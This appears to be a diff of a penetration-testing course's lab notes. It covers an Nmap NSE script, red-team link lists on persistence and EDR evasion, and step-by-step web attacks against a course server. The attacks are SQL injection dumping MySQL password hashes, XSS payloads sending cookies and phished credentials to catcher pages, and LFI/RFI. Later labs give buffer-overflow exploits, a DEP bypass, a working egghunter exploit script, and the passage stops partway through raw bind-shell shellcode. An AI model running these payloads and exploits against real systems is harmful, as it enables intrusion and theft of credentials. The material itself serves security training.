+    local uri = "/installing-metasploit-in-ubunt/"
+    local response = http.get(host, port, uri)
+ 
+    if ( response.status == 200 ) then
+        return response.body
+    end
+ 
+end
+----------------------------------------------------------------------
+ 
+- Ok, now that we've made that change let's run the script
+sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse www.darkoperator.com -p 22,80,443
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+----------------------------------------------------------------------
+sudo vi /usr/share/nmap/scripts/intro-nse.nse
+ 
+-- The Head Section --
+local shortport = require "shortport"
+local http = require "http"
+local string = require "string"
+ 
+-- The Rule Section --
+portrule = shortport.http
+ 
+-- The Action Section --
+action = function(host, port)
+ 
+    local uri = "/installing-metasploit-in-ubunt/"
+    local response = http.get(host, port, uri)
+ 
+    if ( response.status == 200 ) then
+        local title = string.match(response.body, "Installing Metasploit in Ubuntu and Debian")
+        return title
+    end
+ 
+end
+----------------------------------------------------------------------
+ 
+- Ok, now that we've made that change let's run the script
+sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse www.darkoperator.com -p 22,80,443
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+----------------------------------------------------------------------
+sudo vi /usr/share/nmap/scripts/intro-nse.nse
+ 
+-- The Head Section --
+local shortport = require "shortport"
+local http = require "http"
+local string = require "string"
+ 
+-- The Rule Section --
+portrule = shortport.http
+ 
+-- The Action Section --
+action = function(host, port)
+ 
+    local uri = "/installing-metasploit-in-ubunt/"
+    local response = http.get(host, port, uri)
+ 
+    if ( response.status == 200 ) then
+        local title = string.match(response.body, "Installing Metasploit in Ubuntu and Debian")
+ 
+        if (title) then
+            return "Vulnerable"
+        else
+            return "Not Vulnerable"
+        end
+    end
+end
+ 
+----------------------------------------------------------------------
+ 
+- Ok, now that we've made that change let's run the script
+sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse www.darkoperator.com -p 22,80,443
+ 
+ 
+ 
+
+################################
+# Attack Environment Deployers #
+################################
+https://github.com/mantvydasb/Red-Team-Infrastructure-Automation
+
+
+
+
+#################
+# Lab Deployers #
+#################
+https://github.com/jaredhaight/PowerShellClassLab
+https://github.com/outflanknl/Invoke-ADLabDeployer
+https://github.com/AutomatedLab/AutomatedLab
+
+
+
+
+###############
+# Persistence #
+###############
+https://rastamouse.me/2018/03/a-view-of-persistence/
+https://blog.inspired-sec.com/archive/2017/01/20/WMI-Persistence.html
+https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/
+https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/
+
+
+
+
+####################
+# Lateral Movement #
+####################
+
+
+###########################
+# Bypassing EDR Solutions #
+###########################
+https://lospi.net/security/assembly/c/cpp/developing/software/2017/03/04/gargoyle-memory-analysis-evasion.html
+https://github.com/vysecurity/morphHTA
+https://labs.mwrinfosecurity.com/blog/experimenting-bypassing-memory-scanners-with-cobalt-strike-and-gargoyle/
+ 
+
+#######################
+# Attacking PHP/MySQL #
+#######################
+ 
+Go to LAMP Target homepage
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/
+-------------------------------------------------------------------------------------
+ 
+ 
+Clicking on the Acer Link:
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer
+-------------------------------------------------------------------------------------
+ 
+    - Found parameter passing (answer yes to question 1)
+    - Insert ' to test for SQLI
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer'
+-------------------------------------------------------------------------------------  
+ 
+Page returns the following error:
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''acer''' at line 1
+ 
+ 
+ 
+In order to perform union-based sql injection - we must first determine the number of columns in this query.
+We do this using the ORDER BY
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 100-- +
+-------------------------------------------------------------------------------------
+ 
+ 
+Page returns the following error:
+Unknown column '100' in 'order clause'
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 50-- +
+-------------------------------------------------------------------------------------  
+ 
+ 
+Page returns the following error:
+Unknown column '50' in 'order clause'
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 25-- +
+-------------------------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '25' in 'order clause'
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 12-- +
+-------------------------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '12' in 'order clause'
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 6-- +
+-------------------------------------------------------------------------------------
+---Valid page returned for 5 and 6...error on 7 so we know there are 6 columns
+ 
+ 
+ 
+Now we build out the union all select statement with the correct number of columns
+ 
+Reference:
+http://www.techonthenet.com/sql/union.php
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' union all select 1,2,3,4,5,6-- +
+-------------------------------------------------------------------------------------
+ 
+ 
+ 
+Now we negate the parameter value 'acer' by turning into the word 'null':
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,4,5,6-- j
+-------------------------------------------------------------------------------------
+ 
+We see that a 4 and a 5 are on the screen. These are the columns that will echo back data
+ 
+ 
+Use a cheat sheet for syntax:
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+ 
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),5,6-- j
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),version(),6-- j
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),@@version,6-- +
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),@@datadir,6-- +
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user,password,6 from mysql.user -- a
+------------------------------------------------------------------------------------- -------------------
+ 
+ 
+ 
+ 
+Sometimes students ask about the "-- j" or "-- +" that I append to SQL injection attack string.
+ 
+Here is a good reference for it:
+https://www.symantec.com/connect/blogs/mysql-injection-comments-comments
+ 
+Both attackers and penetration testers alike often forget that MySQL comments deviate from the standard ANSI SQL specification. The double-dash comment syntax was first supported in MySQL 3.23.3. However, in MySQL a double-dash comment "requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, and so on)." This double-dash comment syntax deviation is intended to prevent complications that might arise from the subtraction of negative numbers within SQL queries. Therefore, the classic SQL injection exploit string will not work against backend MySQL databases because the double-dash will be immediately followed by a terminating single quote appended by the web application. However, in most cases a trailing space needs to be appended to the classic SQL exploit string. For the sake of clarity we'll append a trailing space and either a "+" or a letter.
+ 
+ 
+ 
+###############################################################################
+# What is XSS                                                                 #
+# https://s3.amazonaws.com/infosecaddictsfiles/2-Intro_To_XSS.pptx            #
+###############################################################################
+ 
+OK - what is Cross Site Scripting (XSS)
+ 
+1. Use Firefox to browse to the following location:
+    ---------------------------Paste this into Firefox-----------------------------------
+    http://45.63.104.73/xss_practice/
+    -------------------------------------------------------------------------------------
+ 
+    A really simple search page that is vulnerable should come up.
+ 
+ 
+ 
+ 
+2. In the search box type:
+    ---------------------------Paste this into Firefox-----------------------------------
+    <script>alert('So this is XSS')</script>
+    -------------------------------------------------------------------------------------
+ 
+ 
+    This should pop-up an alert window with your message in it proving XSS is in fact possible.
+    Ok, click OK and then click back and go back to http://45.63.104.73/xss_practice/
+ 
+ 
+3. In the search box type:
+    ---------------------------Paste this into Firefox-----------------------------------
+    <script>alert(document.cookie)</script>
+    -------------------------------------------------------------------------------------
+ 
+ 
+    This should pop-up an alert window with your message in it proving XSS is in fact possible and your cookie can be accessed.
+    Ok, click OK and then click back and go back to http://45.63.104.73/xss_practice/
+ 
+4. Now replace that alert script with:
+    ---------------------------Paste this into Firefox-----------------------------------
+    <script>document.location="http://45.63.104.73/xss_practice/cookie_catcher.php?c="+document.cookie</script>
+    -------------------------------------------------------------------------------------
+ 
+This will actually pass your cookie to the cookie catcher that we have sitting on the webserver.
+ 
+ 
+5. Now view the stolen cookie at:
+   ---------------------------Paste this into Firefox-----------------------------------
+   http://45.63.104.73/xss_practice/cookie_stealer_logs.html
+   -------------------------------------------------------------------------------------  
+ 
+The cookie catcher writes to this file and all we have to do is make sure that it has permissions to be written to.
+ 
+ 
+ 
+ 
+ 
+ 
+############################
+# A Better Way To Demo XSS #
+############################
+ 
+ 
+Let's take this to the next level. We can modify this attack to include some username/password collection. Paste all of this into the search box.
+ 
+ 
+Use Firefox to browse to the following location:
+---------------------------Paste this into Firefox-----------------------------------
+    http://45.63.104.73/xss_practice/
+-------------------------------------------------------------------------------------  
+ 
+ 
+Paste this in the search box
+----------------------------
+ 
+ 
+Option 1
+--------
+---------------------------Paste this into Firefox-----------------------------------
+<script>
+password=prompt('Your session is expired. Please enter your password to continue',' ');
+document.write("<img src=\"http://45.63.104.73/xss_practice/passwordgrabber.php?password=" +password+"\">");
+</script>
+-------------------------------------------------------------------------------------  
+ 
+Now view the stolen cookie at:
+---------------------------Paste this into Firefox-----------------------------------
+    http://45.63.104.73/xss_practice/passwords.html
+-------------------------------------------------------------------------------------  
+ 
+ 
+Option 2
+--------
+-------------------------Paste this into Firefox-----------------------------------
+<script>
+username=prompt('Please enter your username',' ');
+password=prompt('Please enter your password',' ');
+document.write("<img src=\"http://45.63.104.73/xss_practice/unpw_catcher.php?username="+username+"&password="+password+"\">");
+</script>
+-------------------------------------------------------------------------------------  
+ 
+ 
+ 
+Now view the stolen cookie at:
+http://45.63.104.73/xss_practice/username_password_logs.html
+ 
+ 
+ 
+ 
+#########################################
+# Let's try a local file include (LFI)  #
+#########################################
+- Here is an example of an LFI
+- Open this page in Firefox:
+-------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/showfile.php?filename=contactus.txt
+-------------------------------------------------------------------------------------
+ 
+ 
+- Notice the page name (showfile.php) and the parameter name (filename) and the filename (contactus.txt)
+- Here you see a direct reference to a file on the local filesystem of the victim machine.
+- You can attack this by doing the following:
+-------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/showfile.php?filename=/etc/passwd
+-------------------------------------------------------------------------------------
+ 
+ 
+- This is an example of a Local File Include (LFI), to change this attack into a Remote File Include (RFI) you need some content from
+- somewhere else on the Internet. Here is an example of a text file on the web:
+-------------------------Paste this into Firefox-----------------------------------
+http://www.opensource.apple.com/source/SpamAssassin/SpamAssassin-127.2/SpamAssassin/t/data/etc/hello.txt
+-------------------------------------------------------------------------------------
+ 
+- Now we can attack the target via RFI like this:
+-------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/showfile.php?filename=http://www.opensource.apple.com/source/SpamAssassin/SpamAssassin-127.2/SpamAssassin/t/data/etc/hello.txt
+-------------------------------------------------------------------------------------
+ 
+ 
+ 
+###############################
+# How much fuzzing is enough? #
+###############################
+There really is no exact science for determining the correct amount of fuzzing per parameter to do before moving on to something else.
+ 
+Here are the steps that I follow when I'm testing (my mental decision tree) to figure out how much fuzzing to do.
+ 
+ 
+Step 1: Ask yourself the 3 questions per page of the site.
+ 
+Step 2: If the answer is yes, then go down that particular attack path with a few fuzz strings (I usually do 10-20 fuzz strings per parameter)
+ 
+Step 3: When you load your fuzz strings - use the following decision tree
+ 
+    - Are the fuzz strings causing a default error message (example 404)?
+        - If this is the case then it is most likely NOT vulnerable
+ 
+    - Are the fuzz strings causing a WAF or LB custom error message?
+        - If this is the case then you need to find an encoding method to bypass
+ 
+ 
+    - Are the fuzz strings causing an error message that discloses the backend type?
+        - If yes, then identify DB type and find correct syntax to successfully exploit
+        - Some example strings that I use are:
+            '
+            "
+            ()          <----- Take the parameter value and put it in parenthesis
+            (5-1)       <----- See if you can perform an arithmetic function
+ 
+ 
+    - Are the fuzz strings rendering executable code?
+        - If yes, then report XSS/CSRF/Response Splitting/Request Smuggling/etc
+        - Some example strings that I use are:
+            <b>hello</b>
+            <u>hello</u>
+            <script>alert(123);</script>
+            <script>alert(xss);</script>
+            <script>alert('xss');</script>
+            <script>alert("xss");</script>
+ 
+ 
+###############################################################
+# Question 1: What is the process that you use when you test? #
+###############################################################
+ 
+Step 1: Automated Testing
+ 
+Step 1a: Web Application vulnerability scanners
+-----------------------------------------------
+- Run two (2) unauthenticated vulnerability scans against the target
+- Run two (2) authenticated vulnerability scans against the target with low-level user credentials
+- Run two (2) authenticated vulnerability scans against the target with admin privileges
+ 
+The web application vulnerability scanners that I use for this process are (HP Web Inspect, and Acunetix).
+ 
+A good web application vulnerability scanner comparison website is here:
+http://sectoolmarket.com/price-and-feature-comparison-of-web-application-scanners-unified-list.html
+ 
+ 
+Look to see if there are cases where both scanners identify the same vulnerability. Investigate these cases thoroughly, ensure that it is NOT a false positive, and report the issue.
+ 
+When you run into cases where one (1) scanner identifies a vulnerability that the other scanner does not you should still investigate these cases thoroughly, ensure that it is NOT a false positive, and report the issue.
+ 
+ 
+Be sure to look for scans that take more than 3 or 4 hours as your scanner may have lost its active session and is probably not actually finding real vulnerabilities anymore.
+ 
+ 
+Also, be sure to save the scan results and logs. I usually provide this data to the customer.
+ 
+ 
+ 
+Step 1b: Directory Brute Forcer
+-------------------------------
+I like to run DirBuster or a similar tool. This is great to find hidden gems (backups of the website, information leakage, unreferenced files, dev sites, etc).
+ 
+ 
+ 
+Step 2: Manual Testing
+ 
+Try to do this step while your automated scans are running. Use Burp Suite or the Tamper Data Firefox extension to browse EVERY PAGE of the website (if this is realistic).
+ 
+Step 2a: Spider/Scan the entire site with Burp Suite
+Save the spider and scan results. I usually provide this data to the customer as well.
+ 
+ 
+Step 2b: Browse through the site using the 3 question method
+Have Burp Suite on with intercept turned off. Browse the website using the 3 question method that I've taught you in the past. When you find a place in the site where the answer to one of the 3 questions is yes - be sure to look at that individual web request in the target section of Burp Suite, right-click on that particular request and choose 'Send to Intruder'.
+ 
+Take the appropriate fuzz list from https://github.com/fuzzdb-project/fuzzdb/ and load it into Intruder. A quick tip for each individual payload is to be sure to send the payload both with and without the parameter value.
+ 
+Here is what I mean:
+http://www.site.com/page.aspx?parametername=parametervalue
+ 
+When you are looking at an individual request - often times Burp Suite will insert the payload in place of the parameter value like this:
+ 
+http://www.site.com/page.aspx?parametername=[ payload ]
+ 
+You need to ensure that you send the payload this way, and like this below:
+ 
+http://www.site.com/page.aspx?parametername=parametervalue[ payload ]
+ 
+This little hint will pay huge dividends in actually EXPLOITING the vulnerabilities you find instead of just identifying them.
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+###########################################
+# Question 2: How much fuzzing is enough? #
+###########################################
+There really is no exact science for determining the correct amount of fuzzing per parameter to do before moving on to something else.
+ 
+Here are the steps that I follow when I'm testing (my mental decision tree) to figure out how much fuzzing to do.
+ 
+ 
+Step 1: Ask yourself the 3 questions per page of the site.
+ 
+Step 2: If the answer is yes, then go down that particular attack path with a few fuzz strings (I usually do 10-20 fuzz strings per parameter)
+ 
+Step 3: When you load your fuzz strings - use the following decision tree
+ 
+    - Are the fuzz strings causing a default error message (example 404)?
+        - If this is the case then it is most likely NOT vulnerable
+ 
+    - Are the fuzz strings causing a WAF or LB custom error message?
+        - If this is the case then you need to find an encoding method to bypass
+ 
+ 
+    - Are the fuzz strings causing an error message that discloses the backend type?
+        - If yes, then identify DB type and find correct syntax to successfully exploit
+        - Some example strings that I use are:
+            '
+            "
+            ()          <----- Take the parameter value and put it in parenthesis
+            (5-1)       <----- See if you can perform an arithmetic function
+ 
+ 
+    - Are the fuzz strings rendering executable code?
+        - If yes, then report XSS/CSRF/Response Splitting/Request Smuggling/etc
+        - Some example strings that I use are:
+            <b>hello</b>
+            <u>hello</u>
+            <script>alert(123);</script>
+            <script>alert(xss);</script>
+            <script>alert('xss');</script>
+            <script>alert("xss");</script>
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+-------------------------------------------------------------------------------------------
+ OWASP Top 10 Video Explanations
+ 
+Burp Suite Reference:
+https://support.portswigger.net/customer/portal/articles/1969845-using-burp-to-test-for-the-owasp-top-ten
+ 
+A1: Injection Vulnerabilities
+https://www.youtube.com/watch?v=9CnpHT5Nn8c&list=PL5wHbxAvWUF6bXvbg2VHxQnCp_weS9hIj
+ 
+ 
+A2: Broken Authentication and Session Management
+https://www.youtube.com/watch?v=R1iGRBG3PJ8&list=PL5wHbxAvWUF6bXvbg2VHxQnCp_weS9hIj&index=2
+ 
+A3: Cross Site Scripting (XSS)
+https://www.youtube.com/watch?v=90XT0j5E7xo&list=PL5wHbxAvWUF6bXvbg2VHxQnCp_weS9hIj&index=4
+ 
+A4: Insecure Direct Object Reference
+https://www.youtube.com/watch?v=bMYpGj2xzpM&list=PL5wHbxAvWUF6bXvbg2VHxQnCp_weS9hIj&index=5
+ 
+ 
+A5: Security Misconfiguration
+https://www.youtube.com/watch?v=ouuXu9_UM0w&index=7&list=PL5wHbxAvWUF6bXvbg2VHxQnCp_weS9hIj
+ 
+ 
+A6: Sensitive Data Exposure
+https://www.youtube.com/watch?v=x-B8I420x7Y&list=PL5wHbxAvWUF6bXvbg2VHxQnCp_weS9hIj&index=8
+ 
+ 
+A7: Missing Function Level Access Control and A8 Cross-Site Request Forgery (CSRF)
+https://www.youtube.com/watch?v=gf6cb7MnP-c&index=9&list=PL5wHbxAvWUF6bXvbg2VHxQnCp_weS9hIj
+ 
+A9 Using Components w/ Known Vulnerabilities & A10 Unvalidated Redirects and Forwards
+https://www.youtube.com/watch?v=WqlSl-Pc1vk&list=PL5wHbxAvWUF6bXvbg2VHxQnCp_weS9hIj&index=10
+ 
+ 
+ 
+ 
+
+
+
+
+
+
+
+
+
+Day 2
+=-------------------------------------------------------------------------
+
+
+###########################
+# Lab 1a: Stack Overflows #
+###########################
+ 
+    #################################
+    # Start WarFTPd                 #
+    # Start WinDBG                  #
+    # Press F6                      #
+    # Attach to war-ftpd.exe        #
+    #################################
+ 
+---------------------------Type This-----------------------------------
+c:\python27\python.exe warftpd1.py XPSP3-ED-Target-IP
+-----------------------------------------------------------------------
+ 
+    At WINDBG prompt
+    “r” to show registers or “alt+4”
+ 
+---------------------------Type This-----------------------------------
+    0:003> dd eip
+    0:003> dd esp
+-----------------------------------------------------------------------
+ 
+---------------------------Type This-----------------------------------
+ 
+c:\python27\python.exe warftpd2.py XPSP3-ED-Target-IP
+-----------------------------------------------------------------------
+ 
+ 
+    At WINDBG prompt
+    “r” to show registers or “alt+4”
+ 
+---------------------------Type This-----------------------------------
+ 
+    0:003> dd eip
+    0:003> dd esp
+-----------------------------------------------------------------------
+ 
+    Eip: 32714131
+    esp: affd58     (71413471)
+ 
+    Now we need to SSH into the StrategicSec Ubuntu host
+ 
+---------------------------Type This-----------------------------------
+ 
+    cd /usr/share/metasploit-framework/tools/exploit/
+ 
+    ./pattern_offset.rb -q 32714131
+    485
+   
+    ./pattern_offset.rb -q 71413471
+    493
+-----------------------------------------------------------------------
+ 
+    Distance to EIP is:         	485
+    Relative position of ESP is:    493
+ 
+    RET – POP EIP
+    RET 4 – POP EIP and shift ESP down by 4 bytes
+ 
+---------------------------Type This-----------------------------------
+ 
+    wget https://raw.githubusercontent.com/pwnieexpress/metasploit-framework/master/msfpescan
+    mkdir DLLs
+    ./msfpescan -j ESP DLLs/shell32.dll
+-----------------------------------------------------------------------
+ 
+        0x7c9c167d push esp; retn 0x304d
+        0x7c9d30d7 jmp esp < - how about we use this one
+        0x7c9d30eb jmp esp
+        0x7c9d30ff jmp esp
+ 
+ 
+        warftpd3.py with Notepad++
+        Fill in the appropriate values
+        Distance to EIP
+        Address of JMP ESP
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+c:\python27\python.exe warftpd3.py XPSP3-ED-Target-IP
+ 
+    0:003> dd eip
+    0:003> dd esp
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+    Mention bad characters
+    No debugger
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+c:\python27\python.exe warftpd4.py XPSP3-ED-Target-IP
+ 
+nc XPSP3-ED-Target-IP 4444
+-----------------------------------------------------------------------
+ 
+ 
+ 
+###########################################
+# Lab 1b: Stack Overflows with DEP Bypass #
+###########################################
+ 
+Reboot your target host and choose the "2nd" option for DEP.
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+c:\python27\python.exe warftpd1.py XPSP3-ED-Target-IP
+ 
+    At WINDBG prompt
+    “r” to show registers or “alt+4”
+ 
+    dd esp
+ 
+ 
+ 
+ 
+c:\python27\python.exe warftpd2.py XPSP3-ED-Target-IP
+ 
+ 
+    At WINDBG prompt
+    “r” to show registers or “alt+4”
+    dd esp
+-----------------------------------------------------------------------
+ 
+    Eip: 32714131
+    esp: affd58     (71413471)
+ 
+    Now we need to SSH into the StrategicSec Ubuntu host
+ 
+---------------------------Type This-----------------------------------
+ 
+    cd /home/strategicsec/toolz/metasploit/tools
+ 
+    ruby pattern_offset.rb 32714131
+    485
+   
+    ruby pattern_offset.rb 71413471
+    493
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+cd /home/strategicsec/toolz/metasploit/tools
+ 
+ruby pattern_offset.rb 32714131
+ 
+cd /home/strategicsec/toolz/metasploit/
+ 
+./msfpescan -j ESP DLLs/xpsp3/shell32.dll | grep 0x7c9d30d7
+ 
+ 
+ 
+c:\python27\python.exe warftpd3.py XPSP3-ED-Target-IP
+ 
+    0:003> dd eip
+    0:003> dd esp
+ 
+INT3s - GOOD!!!!!!!
+ 
+ 
+ 
+c:\python27\python.exe warftpd4.py XPSP3-ED-Target-IP
+ 
+nc XPSP3-ED-Target-IP 4444
+-----------------------------------------------------------------------
+ 
+ 
+strategicsec....exploit no workie!!!!
+ 
+ 
+Why????????? DEP!!!!!!!!!!!!!
+ 
+ 
+ 
+ 
+Let's look through ole32.dll for the following instructions:
+ 
+mov al,0x1
+ret 0x4
+ 
+We need to set al to 0x1 for the LdrpCheckNXCompatibility routine.
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+./msfpescan -D -r "\xB0\x01\xC2\x04" DLLs/xpsp3/ole32.dll
+-----------------------------------------------------------------------
+ 
+[DLLs/xpsp3/ole32.dll]
+0x775ee00e b001c204
+0x775ee00e      mov al, 1
+0x775ee010      ret 4
+ 
+ 
+Then we need to jump to the LdrpCheckNXCompatibility routine in
+ntdll.dll that disables DEP.
+ 
+ 
+ 
+Inside of ntdll.dll we need to find the following instructions:
+ 
+CMP AL,1
+PUSH 2
+POP ESI
+JE ntdll.7
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+./msfpescan -D -r "\x3C\x01\x6A\x02\x5E\x0F\x84" DLLs/xpsp3/ntdll.dll
+-----------------------------------------------------------------------
+ 
+[DLLs/xpsp3/ntdll.dll]
+0x7c91cd24 3c016a025e0f84
+0x7c91cd24      cmp al, 1
+0x7c91cd26      push 2
+0x7c91cd28      pop esi
+0x7c91cd29      jz 7
+ 
+ 
+This set of instructions makes sure that AL is set to 1, 2 is pushed
+on the stack then popped into ESI.
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+dep = "\x0e\xe0\x5e\x77"+\
+"\xff\xff\xff\xff"+\
+"\x24\xcd\x91\x7c"+\
+"\xff\xff\xff\xff"+\
+"A"*0x54
+ 
+ 
+ 
+ 
+c:\python27\python.exe warftpd5.py XPSP3-ED-Target-IP
+ 
+nc XPSP3-ED-Target-IP 4444
+-----------------------------------------------------------------------
+ 
+ 
+########################################
+# Lab 2a: Not Enough Space (Egghunter) #
+########################################
+
+-----------------------------------------------------------------------
+ 
+SWS - SIMPLE WEB SERVER
+-----------------------
+ 
+Running SWS on Strategicsec-XP-ED-Target-VM
+Start > Programs > Simple Web Server (it's in the middle somewhere)
+Red icon in system tray
+Double click it
+- it will pop up a menu
+- select "start"
+- dialog box shows starting params - port 82
+ 
+WinDBG
+- attach to "server.exe"
+ 
+---------------------------Type This-----------------------------------
+ 
+c:\python27\python.exe  sws1.py XPSP3-ED-Target-IP
+ 
+    0:003> dd eip
+    0:003> dd esp 
+ 
+c:\python27\python.exe  sws2.py XPSP3-ED-Target-IP
+  
+    0:003> dd eip
+    0:003> dd esp
+ 
+SSH into the Ubuntu host (user: strategicsec/pass: strategicsec)
+cd /home/strategicsec/toolz/metasploit/tools
+ruby pattern_offset.rb 41356841             <------- You should see that EIP is at 225
+ruby pattern_offset.rb 68413668             <------- You should see that ESP is at 229
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+EGGHUNTER:
+----------
+ 
+"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74"
+"\xEF\xB8\x41\x42\x42\x41\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
+          ^^^^^^^^^^^^^^^^
+               ABBA
+                                         JMP ESP
+                                        /
+                                       /
+GET /AAAAAAAAAAA...225...AAAAAAAAAA[ EIP ]$egghunter HTTP/1.0
+User-Agent: ABBAABBA LARGE SHELLCODE (Alpha2 encoded)
+ 
+ 
+ 
+ 
+-----sws3.py-----
+#!/usr/bin/python2
+import os
+import sys
+import socket
+import struct # for pack function
+
+if len(sys.argv) < 2:
+	sys.stderr.write("Usage: sws3.py <host>\n")
+	sys.exit(1)
+
+
+target = sys.argv[1]
+port = 82
+ 
+ 
+pad = "A" * 225        # distance to EIP
+eip = 0x7e429353       # replace EIP to point to "jmp esp" from user32.dll
+ 
+egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74"
+egghunter += "\xEF\xB8\x41\x42\x42\x41\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
+ 
+shellcode = "\xCC" * 700
+ 
+buf = "GET /"
+buf += pad + struct.pack('<I', eip) + egghunter
+buf += " HTTP/1.0\r\n"
+buf += "User-Agent: ABBAABBA"
+buf += shellcode
+buf += " HTTP/1.0\r\n"
+ 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # for TCP
+# s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for UDP
+
+try:
+	s.connect((target, port))
+	s.sendall(buf)
+except Exception as e:
+	sys.stderr.write("Cannot send to "+str(target)+" : "+str(port)+" : "+str(e)+"!\n")
+finally:
+	s.close()
+	sys.stderr.write("Sent.\n")
+-----
+ 
+############################################
+# Lab 2b: Not Enough Space (Negative Jump) #
+############################################
+ 
+
+ 
+-----------------------------------------------------------------------
+ 
+[pad = distance_to_seh - len(shellcode) ] [ shellcode] [jmp4 = "\x90\x90\xEB\x04"] [eip (pop pop ret)] [jmp_min = "\xE9\x98\xEF\xFF\xFF"]
+ 
+                                    ^
+1 ----------------------1 overflow the buffer---------------------------|
+                                   
+                                    ^                    ^
+                                    |
+                                    2 ----jump over seh record---|
+ 
+                                                     ^              ^  
+                                                     |
+                                                     3--POP 2 words off stack---|
+ 
+                                                                    ^                  
+4 -----negative jump into NOPs - then into shellcode -----------------------------------------------------------------------------------|
+ 
+ 
+#########################################
+# Lab 2c: Not Enough Space (Trampoline) #
+#########################################
+ 
+---------------------------Type This-----------------------------------
+ 
+cd C:\Documents and Settings\strategic security\Desktop\ED-Workshop-Files\Lab2c\tftpd_skeleton
+-----------------------------------------------------------------------
+ 
+ 
+On the Strategicsec-XP-ED-Target-VM VM
+ 
+- open a command prompt
+- c:\software\tftpd32
+- run tftpd32.exe
+- UDP port 69
+(socket code is already in the scripts)
+ 
+ 
+ 
+ 
+On your attack host please install:
+ 
+ 
+  NASM - Netwide Assembler
+ 
+ 
+ 
+ 
+ 
+-----------------------------------------------------------------------------------------------------------------
+ 
+ 
+We want to generate the shellcode (BIND SHELL on Port 4444)
+- No restricted characters
+- Encoder: NONE
+ 
+Create a Python file called dumpshellcode.py
+ 
+---
+#!/usr/bin/python2
+ 
+import os
+import sys
+import struct
+ 
+ 
+# win32_bind -  EXITFUNC=seh LPORT=4444 Size=317 Encoder=None http://metasploit.com
+shellcode = "\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"
+shellcode += "\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"
+shellcode += "\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"
+shellcode += "\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66"
+shellcode += "\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61"
+shellcode += "\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40"
+shellcode += "\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32"
+shellcode += "\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6"
+shellcode += "\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09"
+shellcode += "\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0"
+shellcode += "\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff"
